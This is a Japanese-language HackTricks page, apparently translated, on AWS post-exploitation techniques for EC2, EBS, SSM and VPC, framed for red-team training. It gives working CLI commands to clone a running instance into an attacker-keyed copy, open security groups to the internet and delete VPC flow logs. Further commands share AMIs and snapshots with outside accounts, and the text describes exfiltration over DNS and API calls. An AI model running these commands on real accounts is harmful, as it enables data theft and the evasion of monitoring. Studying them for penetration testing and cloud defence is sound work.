# AWS - EC2, EBS, SSM & VPC ポストエクスプロイト

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)で</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>ゼロからヒーローまでのAWSハッキングを学ぶ</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式のPEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見する、私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクション
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加する**、または**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有する**。

</details>

## EC2 & VPC

詳細は以下をチェックしてください:

{% content-ref url="../../../aws-security/aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/" %}
[aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum](../../../aws-security/aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/)
{% endcontent-ref %}

### **悪意のあるVPCミラー**

VPCトラフィックミラーリングは、VPC内のEC2インスタンスの**受信および送信トラフィックを複製します**。これはインスタンス自体に何もインストールする必要がありません。この複製されたトラフィックは通常、分析とモニタリングのためにネットワーク侵入検知システム（IDS）などに送られます。
攻撃者はこれを悪用して、すべてのトラフィックをキャプチャし、そこから機密情報を取得する可能性があります:

{% content-ref url="../../../aws-security/aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/aws-malicious-vpc-mirror.md" %}
[aws-malicious-vpc-mirror.md](../../../aws-security/aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/aws-malicious-vpc-mirror.md)
{% endcontent-ref %}

### 実行中のインスタンスのコピー

インスタンスには通常、何らかの機密情報が含まれています。内部に入る方法はいくつかあります（[EC2権限昇格のコツ](../../../aws-security/aws-privilege-escalation/aws-ec2-privesc.md)をチェックしてください）。しかし、その内容を確認する別の方法は、**AMIを作成し、それから新しいインスタンスを起動することです（自分のアカウントでさえも）**：
```shell
# List instances
aws ec2 describe-images

# create a new image for the instance-id
aws ec2 create-image --instance-id i-0438b003d81cd7ec5 --name "AWS Audit" --description "Export AMI" --region eu-west-1

# add key to AWS
aws ec2 import-key-pair --key-name "AWS Audit" --public-key-material file://~/.ssh/id_rsa.pub --region eu-west-1

# create ec2 using the previously created AMI, use the same security group and subnet to connect easily.
aws ec2 run-instances --image-id ami-0b77e2d906b00202d --security-group-ids "sg-6d0d7f01" --subnet-id subnet-9eb001ea --count 1 --instance-type t2.micro --key-name "AWS Audit" --query "Instances[0].InstanceId" --region eu-west-1

# now you can check the instance
aws ec2 describe-instances --instance-ids i-0546910a0c18725a1

# If needed : edit groups
aws ec2 modify-instance-attribute --instance-id "i-0546910a0c18725a1" --groups "sg-6d0d7f01"  --region eu-west-1

# be a good guy, clean our instance to avoid any useless cost
aws ec2 stop-instances --instance-id "i-0546910a0c18725a1" --region eu-west-1
aws ec2 terminate-instances --instance-id "i-0546910a0c18725a1" --region eu-west-1
```
### EBS スナップショットダンプ

**スナップショットはボリュームのバックアップ**であり、通常**機密情報**を含んでいるため、これらをチェックすることで情報が漏洩する可能性があります。\
スナップショットがない**ボリュームを見つけた場合**、以下のアクションを実行するために**スナップショットを作成する**か、アカウント内のインスタンスに**マウントする**ことができます：

{% content-ref url="../../../aws-security/aws-post-exploitation/aws-ec2-ebs-ssm-and-vpc-post-exploitation/aws-ebs-snapshot-dump.md" %}
[aws-ebs-snapshot-dump.md](../../../aws-security/aws-post-exploitation/aws-ec2-ebs-ssm-and-vpc-post-exploitation/aws-ebs-snapshot-dump.md)
{% endcontent-ref %}

### データ流出

#### DNS を介した流出

EC2 が外部との通信を完全に遮断していても、DNS を介して**データを流出**させることができます。

* **VPC フローログはこれを記録しません**。
* AWS の DNS ログにはアクセスできません。
*   以下の設定でこれを無効にします："enableDnsSupport" を false に設定：

`aws ec2 modify-vpc-attribute --no-enable-dns-support --vpc-id <vpc-id>`

#### API コールを介した流出

攻撃者は自分が管理するアカウントの API エンドポイントを呼び出すことができます。Cloudtrail はこれらの呼び出しを記録し、攻撃者は Cloudtrail のログで流出したデータを確認できます。

### セキュリティグループの開放

このようにポートを開放することで、ネットワークサービスへのさらなるアクセスを得ることができます：

{% code overflow="wrap" %}
```bash
aws ec2 authorize-security-group-ingress --group-id <sg-id> --protocol tcp --port 80 --cidr 0.0.0.0/0
# Or you could just open it to more specific ips or maybe th einternal network if you have already compromised an EC2 in the VPC
```
{% endcode %}

### SSM ポストエクスプロイト

{% content-ref url="../../../aws-security/aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/aws-ssm-post-exploitation.md" %}
[aws-ssm-post-exploitation.md](../../../aws-security/aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/aws-ssm-post-exploitation.md)
{% endcontent-ref %}

### ECS への権限昇格

EC2 インスタンスを実行し、ECS インスタンスを実行するために登録し、その後 ECS インスタンスのデータを盗むことが可能です。

[**詳細はこちらをご覧ください**](../../../aws-security/aws-privilege-escalation/aws-ec2-privesc.md#privesc-to-ecs)。

### VPC フローログの削除
```bash
aws ec2 delete-flow-logs --flow-log-ids <flow_log_ids> --region <region>
```
### AMIを共有する

{% code overflow="wrap" %}
```bash
aws ec2 modify-image-attribute --image-id <image_ID> --launch-permission "Add=[{UserId=<recipient_account_ID>}]" --region <AWS_region>
```
### EBS スナップショットの共有

{% code overflow="wrap" %}
```bash
aws ec2 modify-snapshot-attribute --snapshot-id <snapshot_ID> --create-volume-permission "Add=[{UserId=<recipient_account_ID>}]" --region <AWS_region>
```
<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をチェック！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加する**、または**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有する**。

</details>
